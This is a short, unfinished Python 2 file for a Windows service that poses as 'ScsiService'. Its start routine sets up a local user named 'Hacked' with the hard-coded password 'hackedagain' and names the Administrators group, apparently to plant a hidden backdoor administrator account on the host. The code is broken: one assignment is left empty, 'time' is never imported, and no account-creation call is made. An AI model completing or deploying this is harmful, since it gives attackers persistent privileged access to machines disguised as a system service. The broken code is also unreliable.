import servicemanager, win32serviceutil, win32service, win32api, win32net, win32netcon, os, ctypes


class Service(win32serviceutil.ServiceFramework):
	_svc_name =  "ScsiService"
	_svc_display_name = "ScsiService"

	def __init__(self, *args):
		win32serviceutil.ServiceFramework.__init__(self,*args)

	def sleep(self, sec):
		win32api.Sleep(sec*1000, True)

	def doSvcRun(self):
		self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
		try:
			self.ReportServiceStatus(win32service.SERVICE_RUNNING)
			self.start()
		except Exception, x:
			self.svcStop()

	def svcStop(self):
		self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
		self.stop()
		self.ReportServiceStatus(win32service.SERVICE_STOPPED)


	def start(self):
		self.runflag = True

		USER = "Hacked"
		GROUP = "Administrators"
		user_info = dict(
			name="Hacked",
			password="hackedagain",
			priv=win32netcon.USER_PRIV_USER,
			home_dir=None,
			comment=None,
			flags=win32netcon.UF_SCRIPT,
			script_dir=None
			)
		usre_group_info = dict(
			domainandname=
			)

		while self.runflag:
			time.sleep(10)

	def stop(self):
		self.runflag=False

if __name__ == '__main__':
	servicemanager.Initialize()
	servicemanager.PrepareToHostSingle(Service)
	servicemanager.StartServiceCtrlDispatcher()
	servicemanager.HandleCommandLine(Service)